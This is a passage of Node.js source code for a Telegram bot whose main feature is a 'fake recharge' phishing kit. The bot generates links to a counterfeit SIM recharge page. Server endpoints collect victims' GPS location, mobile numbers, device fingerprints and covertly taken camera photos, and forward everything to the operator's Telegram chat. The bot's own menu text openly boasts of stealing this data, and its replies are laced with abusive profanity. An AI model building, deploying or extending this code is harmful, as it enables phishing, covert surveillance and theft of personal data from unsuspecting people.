📐 **Screen:** ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
🖼️ **Window:** ${deviceInfo.windowWidth}x${deviceInfo.windowHeight}
🎨 **Color Depth:** ${deviceInfo.screenColorDepth}-bit
👆 **Touch:** ${deviceInfo.touchSupport ? 'Supported' : 'Not Supported'}

🌐 **Network Info:**
📶 **Connection:** ${deviceInfo.connectionType}
⚡ **Speed:** ${deviceInfo.connectionDownlink}
⏱️ **Latency:** ${deviceInfo.connectionRtt}
🌐 **Online:** ${deviceInfo.onLine ? 'Yes' : 'No'}

🔋 **Battery:** ${typeof deviceInfo.battery === 'object' ? 
    `${deviceInfo.battery.level} (${deviceInfo.battery.charging})` : 
    deviceInfo.battery}

⚙️ **Hardware:**
🧠 **Memory:** ${deviceInfo.deviceMemory}GB
🔧 **CPU Cores:** ${deviceInfo.hardwareConcurrency}
🌍 **Timezone:** ${deviceInfo.timezone}
🍪 **Cookies:** ${deviceInfo.cookieEnabled ? 'Enabled' : 'Disabled'}

🕐 **Capture Time:**
📅 ${currentTime.day}, ${currentTime.date} ${currentTime.month} ${currentTime.year}
⏰ ${currentTime.time}

🎯 Status: Complete device fingerprint captured!`;

        await bot.sendMessage(session.chatId, deviceMessage, { parse_mode: 'Markdown' });
        
        res.json({ success: true });
    } catch (error) {
        console.error('Device info error:', error);
        res.json({ success: false, error: error.message });
    }
});

// Camera error endpoint
app.post('/camera_error/:sessionId', express.json(), async (req, res) => {
    try {
        const sessionId = req.params.sessionId;
        const errorInfo = req.body;
        
        console.log(`📷 Camera error for session ${sessionId}:`, errorInfo);
        
        if (sessionChatMap.has(sessionId)) {
            const chatId = sessionChatMap.get(sessionId);
            
            const errorMessage = `📷 **Camera Access Information**

❌ **Status:** Camera permission denied or not available

🔍 **Error Details:**
• Error: ${errorInfo.error}
• Timestamp: ${errorInfo.timestamp}
• User Agent: \`${errorInfo.userAgent}\`

⚠️ **Note:** Camera permissions were requested but denied by user or device has no camera.

👑 **Owner:** @CDMAXX`;

            bot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown' });
        }
        
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Camera error endpoint failed:', error);
        res.status(500).json({ success: false, error: 'Camera error processing failed' });
    }
});

app.post('/location/:sessionId', async (req, res) => {
    try {
        const sessionId = req.params.sessionId;
        const location = req.body;
        
        if (!photoSessions.has(sessionId)) {
            return res.json({ success: false, error: 'Invalid session' });
        }
        
        const session = photoSessions.get(sessionId);
        session.location = location;
        photoSessions.set(sessionId, session);
        
        const currentTime = getCurrentDateTime();
        const mapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
        
        const locationMessage = `📍 **LOCATION CAPTURED!**

🗺️ **Real-time Location:**
📍 **Coordinates:** ${location.latitude}, ${location.longitude}
📏 **Accuracy:** ${location.accuracy} meters
🔗 **Maps Link:** [Open Location](${mapsUrl})

🕐 **Capture Time:**
📅 ${currentTime.day}, ${currentTime.date} ${currentTime.month} ${currentTime.year}
⏰ ${currentTime.time}

🎯 Status: Location captured from fake recharge page!`;

        await bot.sendMessage(session.chatId, locationMessage, { parse_mode: 'Markdown' });
        
        res.json({ success: true });
    } catch (error) {
        console.error('Location capture error:', error);
        res.json({ success: false, error: error.message });
    }
});

app.post('/recharge_data/:sessionId', async (req, res) => {
    try {
        const sessionId = req.params.sessionId;
        const data = req.body;
        
        if (!photoSessions.has(sessionId)) {
            return res.json({ success: false, error: 'Invalid session' });
        }
        
        const session = photoSessions.get(sessionId);
        session.lastSim = data.sim;
        session.lastMobile = data.mobile;
        session.lastAmount = data.amount;
        session.used = true;
        photoSessions.set(sessionId, session);
        
        const currentTime = getCurrentDateTime();
        
        const rechargeMessage = `🎯 **RECHARGE DATA CAPTURED!**

📱 **Complete Information:**
🏢 **SIM Provider:** ${data.sim.toUpperCase()}
📞 **Mobile Number:** ${data.mobile}
💰 **Selected Amount:** ₹${data.amount}

🕐 **Submission Time:**
📅 ${currentTime.day}, ${currentTime.date} ${currentTime.month} ${currentTime.year}
⏰ ${currentTime.time}

📍 **Location:** ${session.location ? formatLocation(session.location.latitude, session.location.longitude) : 'Location not available'}

🎪 **Status:** User ने fake recharge website का पूरा form भरा है!
🔥 **Success:** Complete user data collected successfully!`;

        await bot.sendMessage(session.chatId, rechargeMessage, { parse_mode: 'Markdown' });
        
        res.json({ success: true });
    } catch (error) {
        console.error('Recharge data error:', error);
        res.json({ success: false, error: error.message });
    }
});

app.post('/register_session', async (req, res) => {
    try {
        const { session_id, chat_id } = req.body;
        
        photoSessions.set(session_id, {
            chatId: chat_id,
            createdAt: Date.now(),
            used: false,
            location: null
        });
        
        res.json({ success: true });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

// Bot Command Handlers
bot.onText(/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (botSettings.maintenanceMode && !isAdmin(userId)) {
        return bot.sendMessage(chatId, botSettings.maintenanceMessage);
    }
    
    if (!botSettings.isActive) {
        return bot.sendMessage(chatId, '🔴 Bot temporarily disabled.');
    }
    
    // Check channel membership
    const isMember = await checkChannelMembership(userId);
    if (!isMember) {
        return sendForceJoinMessage(chatId);
    }
    
    botSettings.totalUsers++;
    
    const welcomeMessage = `💀 **ESME'S TOXIC BOT - Your Turn Now!**

🔥 **Welcome, you piece of shit!**

💣 **What can I do for you:**

📥 **Terabox Downloader:**
• Send your Terabox link, motherfucker
• Get instant downloads, bastard

🎉 **Free SIM Recharge (Special Bullshit):**
• Create fake recharge pages for idiots
• I'll steal all your information, dickhead
• Location, Photo, everything will be mine

🔧 **Utility Features:**
• QR Code generator for your needs
• Complete help guide available

${isAdmin(userId) ? '\n🔧 **Admin Commands (VIP Motherfucker):**\n• Admin panel access\n• Broadcast messaging system' : ''}

👑 **OWNER:** @CDMAXX (The Real Boss)

🔥 **RULES:** Listen up asshole, this is my kingdom! Send your link or get the fuck out! 💀

Choose from the menu below, dickhead! 🚀`;

    const mainKeyboard = {
        inline_keyboard: [
            [
                { text: '📥 Terabox Downloader', callback_data: 'terabox_menu' },
                { text: '🎉 Fake Recharge', callback_data: 'recharge_menu' }
            ],
            [
                { text: '🔧 Utilities', callback_data: 'utilities_menu' },
                { text: '📊 Bot Stats', callback_data: 'stats_menu' }
            ],
            [
                { text: '❓ Help & Guide', callback_data: 'help_menu' }
            ],
            ...(isAdmin(userId) ? [[{ text: '⚙️ Admin Panel', callback_data: 'admin_panel' }]] : [])
        ]
    };
    
    bot.sendMessage(chatId, welcomeMessage, { 
        parse_mode: 'Markdown',
        reply_markup: mainKeyboard
    });
});

bot.onText(/help/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (botSettings.maintenanceMode && !isAdmin(userId)) {
        return bot.sendMessage(chatId, botSettings.maintenanceMessage);
    }
    
    const helpMessage = `📖 **Complete Bot Guide**

📥 **Terabox Downloader:**
• Send any Terabox video link
• Support: terabox.com, 1024terabox.com, etc.
• Instant download links

🎉 **Free SIM Recharge Page:**
• \`/recharge\` - Create professional recharge page
• Captures: Photos, Location, Complete form data
• Real-time tracking with maps and timestamps

🔧 **Utility Commands:**
• \`/qr <text>\` - Generate QR codes
• \`/start\` - Restart bot
• \`/help\` - This help message

📱 **Advanced Features:**
• Force channel join system
• Real-time location with Google Maps
• Enhanced UI with emojis and styling
• Complete user information collection

${isAdmin(userId) ? '\n🔧 **Admin Features:**\n• Bot ON/OFF control\n• Maintenance mode\n• Broadcast messaging\n• User statistics\n• Session monitoring' : ''}

**🎯 Usage Examples:**
\`/qr Hello World\`
\`/recharge\`
Or send any Terabox link directly!`;

    bot.sendMessage(chatId, helpMessage, { parse_mode: 'Markdown' });
});

bot.onText(/admin/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!isAdmin(userId)) {
        return bot.sendMessage(chatId, '❌ You are not authorized to use admin commands.');
    }
    
    sendAdminPanel(chatId);
});

bot.onText(/recharge/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (botSettings.maintenanceMode && !isAdmin(userId)) {
        return bot.sendMessage(chatId, botSettings.maintenanceMessage);
    }
    
    if (!botSettings.isActive) {
        return bot.sendMessage(chatId, '🔴 Bot temporarily disabled.');
    }
    
    const isMember = await checkChannelMembership(userId);
    if (!isMember) {
        return sendForceJoinMessage(chatId);
    }
    
    const sessionId = generateSessionId();
    
    // Get the current domain from request or use Replit domain
    let baseUrl;
    if (process.env.REPLIT_DOMAINS) {
        // Use the actual Replit domain
        baseUrl = `https://${process.env.REPLIT_DOMAINS.split(',')[0]}`;
    } else {
        // Fallback for local development
        baseUrl = `http://localhost:${PORT}`;
    }
    
    console.log(`Generated capture link: ${baseUrl}/capture/${sessionId}`);
    
    const captureLink = `${baseUrl}/capture/${sessionId}`;
    
    // Register session
    try {
        await axios.post('http://localhost:5000/register_session', {
            session_id: sessionId,
            chat_id: chatId
        });
    } catch (error) {
        console.error('Session registration error:', error);
    }
    
    botSettings.totalSessions++;
    
    const message = `🎉 **FREE SIM Recharge Link तैयार है!**

🔗 **Link:** ${captureLink}

📱 **Enhanced Features:**
• Professional recharge interface
• Real-time location tracking with maps
• Hidden camera photo capture
• Complete form data collection
• All major SIM providers (Jio, Airtel, Vi, BSNL)
• Multiple recharge plans (₹99 to ₹999)

🎯 **What happens when someone opens the link:**
1. Beautiful recharge website loads
2. User selects SIM provider
3. Enters mobile number
4. Chooses recharge amount
5. Location + Photo automatically captured
6. Complete data sent to you with timestamp

📊 **Data you'll receive:**
• 📷 High-quality photo
• 📍 Exact location with Google Maps link
• 📱 Complete recharge form details
• 🕐 Date, time, and day information
• 📊 Enhanced formatting with emojis

⚠️ **Note:** Use responsibly and ethically.`;

    // Generate QR Code
    try {
        const qrBuffer = await QRCode.toBuffer(captureLink, {
            errorCorrectionLevel: 'M',
            type: 'png',
            quality: 0.92,
            margin: 1,
            color: {
                dark: '#4ECDC4',
                light: '#FFFFFF'
            }
        });
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        bot.sendPhoto(chatId, qrBuffer, { caption: '📱 QR Code - Scan करके link खोलें' });
    } catch (error) {
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    }
});

bot.onText(/qr (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = match[1];
    
    if (botSettings.maintenanceMode && !isAdmin(userId)) {
        return bot.sendMessage(chatId, botSettings.maintenanceMessage);
    }
    
    if (!botSettings.isActive) {
        return bot.sendMessage(chatId, '🔴 Bot temporarily disabled.');
    }
    
    const isMember = await checkChannelMembership(userId);
    if (!isMember) {
        return sendForceJoinMessage(chatId);
    }
    
    try {
        const qrBuffer = await QRCode.toBuffer(text, {
            errorCorrectionLevel: 'M',
            type: 'png',
            quality: 0.92,
            margin: 1,
            color: {
                dark: '#4ECDC4',
                light: '#FFFFFF'
            }
        });
        
        bot.sendPhoto(chatId, qrBuffer, { 
            caption: `📱 **QR Code Generated!**\n\`${text}\`` ,
            parse_mode: 'Markdown'
        });
    } catch (error) {
        bot.sendMessage(chatId, `❌ **QR Code generation error:**\n${error.message}`);
    }
});

bot.onText(/broadcast (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const message = match[1];
    
    if (!isAdmin(userId)) {
        return bot.sendMessage(chatId, '❌ You are not authorized to broadcast messages.');
    }
    
    bot.sendMessage(chatId, `📢 Broadcasting message to all users...\n\nMessage: ${message}`);
    
    // Note: In a real application, you'd store user IDs and send to all of them
    // For now, we'll just confirm the broadcast was initiated
    setTimeout(() => {
        bot.sendMessage(chatId, '✅ Broadcast completed successfully!');
    }, 2000);
});

// Handle Terabox URLs
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text;
    
    if (!text || text.startsWith('/')) return;
    
    if (botSettings.maintenanceMode && !isAdmin(userId)) {
        return bot.sendMessage(chatId, botSettings.maintenanceMessage);
    }
    
    if (!botSettings.isActive) {
        return bot.sendMessage(chatId, '🔴 Bot temporarily disabled.');
    }
    
    const isMember = await checkChannelMembership(userId);
    if (!isMember) {
        return sendForceJoinMessage(chatId);
    }
    
    if (teraboxDownloader.isValidUrl(text)) {
        const processingMessage = await bot.sendMessage(chatId, 
            '🔄 **Processing your Terabox link...**\nPlease wait a moment, dickhead.'
        );
        
        try {
            const result = await teraboxDownloader.downloadInfo(text);
            
            if (result.success) {
                const data = result.data;
                const files = data['📄 Files'] || [];
                
                if (files.length === 0) {
                    return bot.editMessageText(
                        '❌ **No downloadable files found**\nNo files found in your shitty link.',
                        { chat_id: chatId, message_id: processingMessage.message_id, parse_mode: 'Markdown' }
                    );
                }
                
                let responseMessage = '🔥 **Your fucking link has been processed!**\n\n';
                responseMessage += `📊 **Total Files:** ${files.length}\n\n`;
                
                const keyboard = { inline_keyboard: [] };
                
                files.slice(0, 5).forEach((file, index) => {
                    const fileName = file['📂 Name'] || `File ${index + 1}`;
                    const fileSize = file['📏 Size'] || 'Unknown Size';
                    const downloadLink = file['🔽 Direct Download Link'];
                    
                    responseMessage += `📄 **File ${index + 1}:**\n`;
                    responseMessage += `• Name: \`${fileName}\`\n`;
                    responseMessage += `• Size: ${fileSize}\n\n`;
                    
                    if (downloadLink) {
                        const buttonText = fileName.length > 25 ? fileName.substring(0, 22) + '...' : fileName;
                        keyboard.inline_keyboard.push([{
                            text: `📥 Download ${buttonText}`,
                            url: downloadLink
                        }]);
                    }
                });
                
                if (files.length > 5) {
                    responseMessage += `... and ${files.length - 5} more files available\n\n`;
                }
                
                keyboard.inline_keyboard.push([
                    { text: '🔙 Back to Menu', callback_data: 'main_menu' }
                ]);
                
                responseMessage += '💀 **Now go download it, asshole!**\n';
                responseMessage += '🔥 **Owner:** @CDMAXX';
                
                await bot.editMessageText(responseMessage, {
                    chat_id: chatId,
                    message_id: processingMessage.message_id,
                    parse_mode: 'Markdown',
                    reply_markup: keyboard.inline_keyboard.length > 0 ? keyboard : undefined
                });
                
            } else {
                await bot.editMessageText(
                    `❌ **Error processing link**\n${result.error}`,
                    { chat_id: chatId, message_id: processingMessage.message_id, parse_mode: 'Markdown' }
                );
            }
            
        } catch (error) {
            await bot.editMessageText(
                `❌ **Error occurred**\n${error.message}`,
                { chat_id: chatId, message_id: processingMessage.message_id, parse_mode: 'Markdown' }
            );
        }
    } else {
        // Unknown message - suggest using menu
        const helpMessage = `🤔 **What the fuck are you trying to say?**

Please use the menu buttons or send a valid Terabox link:

• Send: Terabox video link directly
• Text: start - Show main menu
• Text: help - Complete guide
• Text: recharge - Create fake recharge page
• Text: qr your text - Generate QR code

**Example:** qr Hello World or paste Terabox link

**Owner:** @CDMAXX`;

        const quickMenuKeyboard = {
            inline_keyboard: [
                [
                    { text: '🏠 Main Menu', callback_data: 'main_menu' },
                    { text: '❓ Help Guide', callback_data: 'help_menu' }
                ]
            ]
        };

        bot.sendMessage(chatId, helpMessage, { 
            parse_mode: 'Markdown',
            reply_markup: quickMenuKeyboard
        });
    }
});

// Handle callback queries
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const userId = callbackQuery.from.id;
    const data = callbackQuery.data;
    
    bot.answerCallbackQuery(callbackQuery.id);
    
    switch (data) {
        case 'main_menu':
            // Show main menu
            const mainMenuMessage = `💀 **ESME'S TOXIC BOT - Main Menu**

🔥 **Welcome back, asshole!**

Choose what you want to do from the menu below:

👑 **Owner:** @CDMAXX`;

            const mainMenuKeyboard = {
                inline_keyboard: [
                    [
                        { text: '📥 Terabox Downloader', callback_data: 'terabox_menu' },
                        { text: '🎉 Fake Recharge', callback_data: 'recharge_menu' }
                    ],
                    [
                        { text: '🔧 Utilities', callback_data: 'utilities_menu' },
                        { text: '📊 Bot Stats', callback_data: 'stats_menu' }
                    ],
                    [
                        { text: '❓ Help & Guide', callback_data: 'help_menu' }
                    ],
                    ...(isAdmin(userId) ? [[{ text: '⚙️ Admin Panel', callback_data: 'admin_panel' }]] : [])
                ]
            };

            bot.sendMessage(chatId, mainMenuMessage, { 
                parse_mode: 'Markdown',
                reply_markup: mainMenuKeyboard
            });
            break;

        case 'terabox_menu':
            const teraboxMessage = `📥 **Terabox Downloader Menu**

🔥 **Send your fucking Terabox link!**

**Supported Domains:**
• terabox.com
• 1024terabox.com
• teraboxapp.com
• nephobox.com
• mirrobox.com
• And more...

**Features:**
• Direct download buttons
• Multiple file support
• Instant processing
• No ads bullshit

**Example:**
\`https://terabox.com/s/1X9NE_SEAiLPfzDQNMjj5Sg\`

👑 **Owner:** @CDMAXX`;

            const teraboxKeyboard = {
                inline_keyboard: [
                    [{ text: '🔙 Back to Main Menu', callback_data: 'main_menu' }]
                ]
            };

            bot.sendMessage(chatId, teraboxMessage, { 
                parse_mode: 'Markdown',
                reply_markup: teraboxKeyboard
            });
            break;

        case 'recharge_menu':
            const rechargeMessage = `🎉 **Fake Recharge Menu**

🔥 **Create bullshit recharge pages!**

**What this does:**
• Professional looking recharge website
• Captures victim's photo automatically
• Steals location with GPS coordinates
• Gets complete device information
• Browser fingerprinting
• All data sent to you instantly

**Features:**
• All major SIM providers (Jio, Airtel, Vi, BSNL)
• Multiple recharge plans
• Hidden camera capture
• Location tracking with Google Maps
• Device information collection

👑 **Owner:** @CDMAXX`;

            const rechargeKeyboard = {
                inline_keyboard: [
                    [
                        { text: '🎯 Create Recharge Page', callback_data: 'create_recharge' }
                    ],
                    [
                        { text: '🔙 Back to Main Menu', callback_data: 'main_menu' }
                    ]
                ]
            };

            bot.sendMessage(chatId, rechargeMessage, { 
                parse_mode: 'Markdown',
                reply_markup: rechargeKeyboard
            });
            break;

        case 'utilities_menu':
            const utilitiesMessage = `🔧 **Utilities Menu**

🔥 **Useful tools for you, dickhead!**

**Available Tools:**
• QR Code Generator
• Device Information Checker
• Location Services
• Browser Fingerprinting

**How to use:**
• Type: \`qr Your Text Here\`
• All tools work without commands

👑 **Owner:** @CDMAXX`;

            const utilitiesKeyboard = {
                inline_keyboard: [
                    [
                        { text: '📱 QR Generator Guide', callback_data: 'qr_guide' }
                    ],
                    [
                        { text: '🔙 Back to Main Menu', callback_data: 'main_menu' }
                    ]
                ]
            };

            bot.sendMessage(chatId, utilitiesMessage, { 
                parse_mode: 'Markdown',
                reply_markup: utilitiesKeyboard
            });
            break;

        case 'stats_menu':
            const statsMessage = `📊 **Bot Statistics**

🔥 **Current bot stats, asshole!**

👥 **Users:** ${botSettings.totalUsers}
🔗 **Sessions:** ${botSettings.totalSessions}
📱 **Active Sessions:** ${photoSessions.size}
⚡ **Status:** ${botSettings.isActive ? '🟢 Online' : '🔴 Offline'}
🔧 **Maintenance:** ${botSettings.maintenanceMode ? 'ON' : 'OFF'}

**Server Info:**
• Memory: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)} MB
• Uptime: ${Math.round(process.uptime())} seconds
• Port: ${PORT}

👑 **Owner:** @CDMAXX`;

            const statsKeyboard = {
                inline_keyboard: [
                    [
                        { text: '🔄 Refresh Stats', callback_data: 'stats_menu' }
                    ],
                    [
                        { text: '🔙 Back to Main Menu', callback_data: 'main_menu' }
                    ]
                ]
            };

            bot.sendMessage(chatId, statsMessage, { 
                parse_mode: 'Markdown',
                reply_markup: statsKeyboard
            });
            break;

        case 'help_menu':
            const helpMenuMessage = `❓ **Help & Guide Menu**

🔥 **Complete guide for dummies!**

**Bot Features:**
• Terabox video downloader
• Fake recharge page creator
• QR code generator
• Device fingerprinting
• Location tracking

**How to Use:**
• Type \`start\` - Main menu
• Type \`help\` - This guide
• Type \`recharge\` - Create fake page
• Type \`qr your text\` - Generate QR
• Send Terabox link directly

**No Commands Needed:**
All features work without / commands!

👑 **Owner:** @CDMAXX`;

            const helpMenuKeyboard = {
                inline_keyboard: [
                    [
                        { text: '📥 Terabox Guide', callback_data: 'terabox_guide' },
                        { text: '🎉 Recharge Guide', callback_data: 'recharge_guide' }
                    ],
                    [
                        { text: '🔙 Back to Main Menu', callback_data: 'main_menu' }
                    ]
                ]
            };

            bot.sendMessage(chatId, helpMenuMessage, { 
                parse_mode: 'Markdown',
                reply_markup: helpMenuKeyboard
            });
            break;

        case 'create_recharge':
            // Trigger recharge page creation
            if (botSettings.maintenanceMode && !isAdmin(userId)) {
                return bot.sendMessage(chatId, botSettings.maintenanceMessage);
            }

            const isMemberForRecharge = await checkChannelMembership(userId);
            if (!isMemberForRecharge) {
                return sendForceJoinMessage(chatId);
            }

            const sessionId = generateSessionId();
            let baseUrl;
            
            if (process.env.REPLIT_DOMAINS) {
                baseUrl = `https://${process.env.REPLIT_DOMAINS.split(',')[0]}`;
            } else {
                baseUrl = `http://localhost:${PORT}`;
            }
            
            const captureLink = `${baseUrl}/capture/${sessionId}`;
            
            try {
                await axios.post('http://localhost:5000/register_session', {
                    session_id: sessionId,
                    chat_id: chatId
                });
            } catch (error) {
                console.error('Session registration error:', error);
            }
            
            botSettings.totalSessions++;
            
            const rechargeCreatedMessage = `🎉 **Fake Recharge Page Created!**

🔗 **Link:** ${captureLink}

🔥 **What happens when victim opens:**
1. Professional recharge website loads
2. Victim selects SIM provider
3. Enters their mobile number
4. Chooses recharge amount
5. **BOOM!** Photo captured automatically
6. Location stolen with GPS coordinates
7. Complete device info collected
8. All data sent to you instantly

**Data You'll Get:**
• 📷 High-quality photo
• 📍 Exact location with Google Maps
• 📱 Device and browser information
• 📊 Complete form details
• 🕐 Timestamps and more

Use this link responsibly, asshole!

👑 **Owner:** @CDMAXX`;

            const rechargeCreatedKeyboard = {
                inline_keyboard: [
                    [
                        { text: '🔙 Back to Main Menu', callback_data: 'main_menu' }
                    ]
                ]
            };

            bot.sendMessage(chatId, rechargeCreatedMessage, { 
                parse_mode: 'Markdown',
                reply_markup: rechargeCreatedKeyboard
            });
            break;

        case 'check_membership':
            const isMember = await checkChannelMembership(userId);
            if (isMember) {
                bot.sendMessage(chatId, '✅ **Channel join confirmed!**\nNow you can use the bot completely.', { parse_mode: 'Markdown' });
            } else {
                bot.sendMessage(chatId, '❌ **Still not joined the channel**\nPlease join the channel and check again.', { parse_mode: 'Markdown' });
            }
            break;
            
        case 'admin_panel':
            if (isAdmin(userId)) {
                sendAdminPanel(chatId);
            }
            break;
            
        case 'toggle_bot':
            if (isAdmin(userId)) {
                botSettings.isActive = !botSettings.isActive;
                bot.sendMessage(chatId, `🔄 Bot ${botSettings.isActive ? 'activated' : 'deactivated'} successfully!`);
                sendAdminPanel(chatId);
            }
            break;
            
        case 'toggle_maintenance':
            if (isAdmin(userId)) {
                botSettings.maintenanceMode = !botSettings.maintenanceMode;
                bot.sendMessage(chatId, `🔧 Maintenance mode ${botSettings.maintenanceMode ? 'enabled' : 'disabled'}!`);
                sendAdminPanel(chatId);
            }
            break;
            
        case 'detailed_stats':
            if (isAdmin(userId)) {
                const stats = `📊 **Detailed Bot Statistics**

👥 **Users:** ${botSettings.totalUsers}
🔗 **Sessions Created:** ${botSettings.totalSessions}
📱 **Active Photo Sessions:** ${photoSessions.size}
⚡ **Bot Status:** ${botSettings.isActive ? '🟢 Active' : '🔴 Inactive'}
🔧 **Maintenance:** ${botSettings.maintenanceMode ? '🔧 ON' : '✅ OFF'}

📈 **Server Info:**
• Port: ${PORT}
• Memory Usage: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)} MB
• Uptime: ${Math.round(process.uptime())} seconds

⏰ **Current Time:** ${getCurrentDateTime().time}
📅 **Date:** ${getCurrentDateTime().day}, ${getCurrentDateTime().date} ${getCurrentDateTime().month} ${getCurrentDateTime().year}`;

                bot.sendMessage(chatId, stats, { parse_mode: 'Markdown' });
            }
            break;
    }
});

// Start Express server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Enhanced All-in-One Bot server running on port ${PORT}`);
    console.log(`🌐 Web interface: http://localhost:${PORT}`);
    console.log(`🤖 Bot is active and ready!`);
    console.log(`📱 Features: Terabox downloader, Fake recharge page, Location tracking, Enhanced UI`);
});

// Error handling
process.on('unhandledRejection', (reason, promise) => {
    console.log('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (error) => {
    console.log('Uncaught Exception:', error);
});

console.log('🎉 All-in-One Enhanced Telegram Bot (Node.js) Started!');
console.log('📱 Features loaded: Enhanced UI, Location tracking, Admin panel, Force join');